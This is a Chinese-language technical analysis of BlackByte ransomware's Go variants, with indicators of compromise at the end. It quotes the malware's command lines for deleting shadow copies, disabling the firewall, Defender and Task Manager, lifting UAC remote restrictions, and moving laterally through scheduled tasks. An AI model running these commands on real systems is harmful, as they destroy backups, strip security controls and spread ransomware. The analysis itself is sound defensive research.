BlackByte 是一个提供勒索软件即服务（RaaS）的攻击组织，自从 2021 年 7 月以来一直保持活跃。最初，BlackByte 使用 C#
开发，最近攻击者使用 Go 重写了恶意软件。FBI 也已经发布公告披露 BlackByte 已经攻击了许多公司，甚至包括美国关键基础设施。

## 技术分析

### 变种

ThreatLabz 的研究人员发现了 BlackByte 的两个变种。第一个变种 BlackByte v1 在 2021 年 9 月出现，与 C# 版本的
BlackByte 存在很多相似之处。在 2022 年 2 月又出现了新版本的变种 BlackByte v2。

### 初始化

在 BlackByte 执行文件加密之前，勒索软件首先会执行初始化，初始化的部分与 C# 版本的 BlackByte 非常相似。

### 互斥体创建

BlackByte 使用硬编码的值创建互斥体，例如
`Global\7b55551e-a59c-4252-a34a-5c80372b3014`，以此确保只有一个 BlackByte 在运行。

### 系统语言识别

如果是列表中的语言，样本将会退出不进行文件加密。

![image.png-20.4kB](https://image.3001.net/images/20220509/1652081408_6278c30002a6339bc10e3.png!small)语言列表

BlackByte 避免感染独联体国家的计算机，这可能表明其背后的攻击者位于东欧或者俄罗斯。

### 长路径

恶意软件执行以下命令以避免加密具有长路径名的文件时可能出现的问题：

> C:\WINDOWS\system32\cmd.exe /c reg add
> HKLM\SYSTEM\CurrentControlSet\Control\FileSystem /v LongPathsEnabled /t
> REG_DWORD /d 1 /f

### 禁用受控文件夹访问

BlackByte 执行以下命令来禁用受控文件夹访问：

> Set-MpPreference -EnableControlledFolderAccess Disabled

### 删除卷影副本

与其他勒索软件类似，BlackByte 也会删除卷影副本以防止使用备份进行数据恢复。命令经过 base64 解码后为 **Get-WmiObject
Win32_Shadowcopy | ForEach-Object {$_.Delete();}** 。

BlackByte 还会执行命令以删除每个驱动器的卷影副本：

> C:\WINDOWS\system32\cmd.exe /c vssadmin resize shadowstorage /for=: /on=:
> /maxsize=401MB  
> C:\WINDOWS\system32\cmd.exe /c vssadmin resize shadowstorage /for=: /on=:
> /maxsize=unbounded

### 进程/服务终止

BlackByte 执行以下命令来终止可能妨碍文件加密的服务：

> C:\WINDOWS\system32\sc.exe config SQLTELEMETRY start= disabled  
> C:\WINDOWS\system32\sc.exe config SQLTELEMETRY$ECWDB2 start= disabled  
> C:\WINDOWS\system32\sc.exe config SQLWriter start= disabled  
> C:\WINDOWS\system32\sc.exe config SstpSvc start= disabled  
> C:\WINDOWS\system32\sc.exe config MBAMService start= disabled  
> C:\WINDOWS\system32\sc.exe config wuauserv start= disabled

BlackByte 还将启动以下服务：

> C:\WINDOWS\system32\sc.exe config Dnscache start= auto  
> C:\WINDOWS\system32\sc.exe config fdPHost start= auto  
> C:\WINDOWS\system32\sc.exe config FDResPub start= auto  
> C:\WINDOWS\system32\sc.exe config SSDPSRV start= auto  
> C:\WINDOWS\system32\sc.exe config upnphost start= auto  
> C:\WINDOWS\system32\sc.exe config RemoteRegistry start= auto

BlackByte 勒索软件在执行时会终止以下进程：

![image.png-48kB](https://image.3001.net/images/20220509/1652081408_6278c3005070acc0e6470.png!small)终止进程列表

BlackByte 终止这些程序，主要避免其进程打开文件句柄在加密时造成权限问题。此外，还有大量的恶意软件分析工具也会被终止，阻碍分析人员对样本进行分析。

BlackByte 也会对大量的安全产品、业务应用程序加以终止。

![image.png-62.2kB](https://image.3001.net/images/20220509/1652081408_6278c30096f0a4bcc7c51.png!small)终止进程列表

### 禁用防火墙

> netsh advfirewall set allprofiles state off

### Windows Defender

删除任务管理器、资源监视器，并终止 Windows Defender 服务。

> cmd /c del C:\Windows\System32\Taskmgr.exe /f /q & del
> C:\Windows\System32\resmon.exe /f /q &  
> powershell -command "x;Set-Service -StartupType Disabled

### 卸载 Raccine

卸载名为 Raccine 的反勒索软件产品，BlackByte 会删除以下的注册表项：

> HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\Raccine Tray
>
>
> HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\EventLog\Application\Raccine
>
> HKEY_CURRENT_USER\SOFTWARE\Raccine
>
> HKEY_LOCAL_MACHINE\SOFTWARE\Raccine

BlackByte 然后通过以下命令删除 Raccine 的计划任务：

> C:\WINDOWS\system32\schtasks.exe /DELETE /TN "\"Raccine Rules Updater\"" /F

### 权限提升

勒索软件执行以下命令来禁用 UAC 远程限制：

> C:\WINDOWS\system32\cmd.exe /c reg add
> HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v
> LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f

BlackByte 设置 EnableLinkedConnections 注册表值以强制将符号链接写入链接登录会话：

> C:\WINDOWS\system32\cmd.exe /c reg add
> HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v
> EnableLinkedConnections /t REG_DWORD /d 1 /f

### 横向平移

BlackByte 执行以下命令来启用网络发现以及文件和打印机共享：

> C:\WINDOWS\system32\cmd.exe /c netsh advfirewall firewall set rule
> "group=\"Network Discovery\"" new enable=Yes  
> C:\WINDOWS\system32\cmd.exe /c netsh advfirewall firewall set rule
> "group=\"File and Printer Sharing\"" new enable=Yes

然后执行以下命令以发现其他计算机和网络文件共享：

> net view  
> arp -a

BlackByte 加载 Active Directory 模块 RSAT-AD-PowerShell 并通过以下命令查询其他计算机：

> C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe Install-> WindowsFeature -Name \"RSAT-AD-PowerShell\" –IncludeAllSubFeature  
> powershell -command "Import-Module ActiveDirectory;Get-ADComputer -Filter *
> -Properties * | FT Name"

BlackByte 使用 Windows 任务调度程序使用以下命令在远程主机上执行勒索软件：

> C:\Windows\system32\schtasks.exe /Create /S /TN /TR "C:\Users\Public\ -s "
> /ru SYSTEM /sc onlogon /RL HIGHEST /f

在 BlackByte v2 中，文件名和任务名是使用产生八个大小写字母和数字字符的函数伪随机生成的。BlackByte v1
使用硬编码的文件名和命令行参数 complex.exe -single 以及硬编码的任务名称 asd。

使用以下命令执行远程 BlackByte 二进制文件：

> C:\Windows\system32\schtasks.exe /S /Run /TN

任务执行后，BlackByte 使用以下命令删除远程任务：

> C:\Windows\system32\schtasks.exe /Delete /S /TN /f

BlackByte 随后会删除它自己在远程主机网络共享上的副本，还会尝试访问管理共享文件夹。

![image.png-12.7kB](https://image.3001.net/images/20220509/1652081409_6278c30102b3992d0b1d0.png!small)攻击目标

### 检查分析工具

如果存在下列 DLL 模块直接退出：

![image.png-14.1kB](https://image.3001.net/images/20220509/1652081409_6278c3013172f66155039.png!small)DLL
列表

### 反调试

BlackByte 试图通过删除 SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File
Execution Options 下的注册表值来防止调试工具监视和附加到各种进程：

> vssadmin.exe
>
> wbadmin.exe
>
> bcdedit.exe
>
> powershell.exe
>
> diskshadow.exe
>
> net.exe
>
> taskkill.exe
>
> wmic.exe
>
> fsutil.exe

### 卸载虚拟机

BlackByte 将执行以下命令识别受害者系统上的虚拟机：

> powershell Get-VM

如果找到任何虚拟机文件，BlackByte 将尝试通过执行以下命令行来卸载映像：

> powershell.exe Dismount-DiskImage -ImagePath

### 加密备份卷

恶意软件执行 mountvol.exe 以尝试挂载额外的卷：

> C:\WINDOWS\system32\mountvol.exe A: \?\Volume{[GUID]}\  
> C:\WINDOWS\system32\mountvol.exe B: \?\Volume{[GUID]}\  
> C:\WINDOWS\system32\mountvol.exe E: \?\Volume{[GUID]}\  
> C:\WINDOWS\system32\mountvol.exe F: \?\Volume{[GUID]}\

挂载和加密备份卷以防止受害者恢复文件。

## 文件加密

BlackByte 会跳过包含以下子字符串的文件：

![image.png-7.5kB](https://image.3001.net/images/20220509/1652081409_6278c3017328dea3debca.png!small)关键词列表

BlackByte 会跳过以下扩展名的文件：

![image.png-18.1kB](https://image.3001.net/images/20220509/1652081409_6278c301a43c04f944ed6.png!small)扩展名列表

BlackByte 会跳过以下目录的文件：

![image.png-15.3kB](https://image.3001.net/images/20220509/1652081409_6278c301da8f16d08ebdc.png!small)目录列表

BlackByte 根据不同文件大小使用不同加密方式加快整体加密速度。

![image.png-14.6kB](https://image.3001.net/images/20220509/1652081410_6278c3024dd69fff9b076.png!small)加密策略

BlackByte 使用扩展名 .blackbyte 重命名加密文件。BlackByte 会在 HKEY_CLASSES_ROOT.blackbyte
下创建一个 DefaultIcon 注册表项，该注册表项指向一个图标文件，因此每个加密的文件都会在 Windows 资源管理器中显示该图标。

另外，HKEY_CURRENT_USER\Control Panel\International 下的 s1159 和 s2359 都被设置为
BLACKBYTE。这些注册表值控制 AM/PM 的时间格式。因此，系统将显示 BLACKBYTE 而不是 AM/PM：

![image.png-62.3kB](https://image.3001.net/images/20220509/1652081410_6278c3028fdb278ab3338.png!small)扩展格式

时间格式修改通过执行以下命令进行：

> reg add "HKCU\Control Panel\International" /v s1159 /t REG_SZ /d BLACKBYTE
> /f  
> reg add "HKCU\Control Panel\International" /v s2359 /t REG_SZ /d BLACKBYTE
> /f

### 变种一加密算法

生成用于文件加密的 AES 密钥的代码如下所示：

![image.png-100.3kB](https://image.3001.net/images/20220509/1652081411_6278c3030714e4115550e.png!small)示例代码

而 RSA 公钥是硬编码的：

> \-----BEGIN PUBLIC KEY-----  
> MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQDUBwECQuQiVGorPYvHrJM11OWV  
> E1PS8gaBqIAfPaR1rQHUEXu3iX/da/dCtV8Z27/SIA/ZYUNhTyUsX9Snjz8zve90  
> QAiG1c/BS81WWRax7M7i1rESStVwOaUDAj5w6cz9GwDMGYI+wve9Qyjtw5R6hr5I  
> qlIEig1Wy1X27vUC2wIDAQAB  
> \-----END PUBLIC KEY-----
### 变种一勒索信息

以下是一个 BlackByte v1 赎金勒索信息示例：

![image.png-53kB](https://image.3001.net/images/20220509/1652081411_6278c30375333881b601a.png!small)勒索信息

### 变种二加密算法

BlackByte v2 加密算法如下所示：

![image.png-31.3kB](https://image.3001.net/images/20220509/1652081411_6278c303c5f8272ddc5c1.png!small)加密算法

如果得到了攻击者的私钥，就可以利用以下代码进行数据解密：

![image.png-80.8kB](https://image.3001.net/images/20220509/1652081412_6278c3041a2ebfbce0dea.png!small)解密代码

BlackByte v2 还会在加密后对文件名进行处理，包括使用硬编码的密钥进行异或加密与 base64 编码：

![image.png-332.8kB](https://image.3001.net/images/20220509/1652081412_6278c30482f903fd39a2e.png!small)文件名加密

异或加密的密钥为 `fuckyou123`，文件名加密后链接扩展名 `.blackbyte`。

### 变种二勒索信息

![image.png-233.4kB](https://image.3001.net/images/20220509/1652081413_6278c30558b33f4508581.png!small)勒索信息示例

![image.png-259.6kB](https://image.3001.net/images/20220509/1652081413_6278c305f3e52280f6243.png!small)勒索信息填充

## 勒索网站

受害者访问网站支付赎金时需要使用访问密钥：

![image.png-377.1kB](https://image.3001.net/images/20220509/1652081414_6278c306ce4e8e29f844d.png!small)网站截图

验证身份后，还可以进行实时聊天：

![image.png-304kB](https://image.3001.net/images/20220509/1652081415_6278c307c5d3ded4cdf4c.png!small)网站截图

如果不支付赎金，数据就会被公开泄露：

![image.png-347.6kB](https://image.3001.net/images/20220509/1652081417_6278c30906cf8a5bfec0b.png!small)网站截图

## 打印轰炸

如果受害者的设备连接了打印机，将会每小时打印一次勒索信息：

![image.png-37.8kB](https://image.3001.net/images/20220509/1652081418_6278c30a3fbb062582fe9.png!small)RTF
文件

## 对抗技术

### 字符串混淆

BlackByte 使用类似于 AdvObfuscator 的工具加密大多数字符串。

![image.png-250.6kB](https://image.3001.net/images/20220509/1652081418_6278c30a8ffc71c4baefc.png!small)字符串混淆示例

### 自定义 UPX 加壳

最新的样本中，BlackByte 开始使用自定义的 UPX 方案进行加壳。UPX0 与 UPX1 的段名称被重命名为 BB0 与 BB1。

![image.png-274.5kB](https://image.3001.net/images/20220509/1652081419_6278c30b55f90edf84e98.png!small)样本示例

### 防病毒检测

由于 BlackByte 使用了诸多反分析功能、多态代码和复杂混淆，许多安全产品都不能正确检出。

## 结论

BlackByte 是一个功能齐备的勒索软件家族，使用多种技术进行攻击且持续升级样本，这可能会对组织数据安全构成重大威胁。

## IOC

> 1df11bc19aa52b623bdf15380e3fded56d8eb6fb7b53a2240779864b1a6474ad  
> 388163c9ec1458c779849db891e17efb16a941ca598c4c3ac3a50a77086beb69  
> 44a5e78fce5455579123af23665262b10165ac710a9f7538b764af76d7771550  
> 6f36a4a1364cfb063a0463d9e1287248700ccf1e0d8e280e034b02cf3db3c442  
> ffc4d94a26ea7bcf48baffd96d33d3c3d53df1bb2c59567f6d04e02e7e2e5aaa  
> 9103194d32a15ea9e8ede1c81960a5ba5d21213de55df52a6dac409f2e58bcfe  
> e434ec347a8ea1f0712561bccf0153468a943e16d2cd792fbc72720bd0a8002e  
> hxxp://7oukjxwkbnwyg7cekudzp66okrchbuubde2j3h6fkpis6izywoj2eqad.]onion  
> hxxp://fyk4jl7jk6viteakzzrxntgzecnz4v6wxaefmbmtmcnscsl3tnwix6yd.]onion  
> hxxp://p5quu5ujzzswxv4nxyuhgg3fjj2vy2a3zmtcowalkip2temdfadanlyd.]onion  
> hxxps://185.93.6[.]31/mountain.png

## 参考来源

> [Zscaler](https://www.zscaler.com/blogs/security-research/analysis-> blackbyte-ransomwares-go-based-variants)

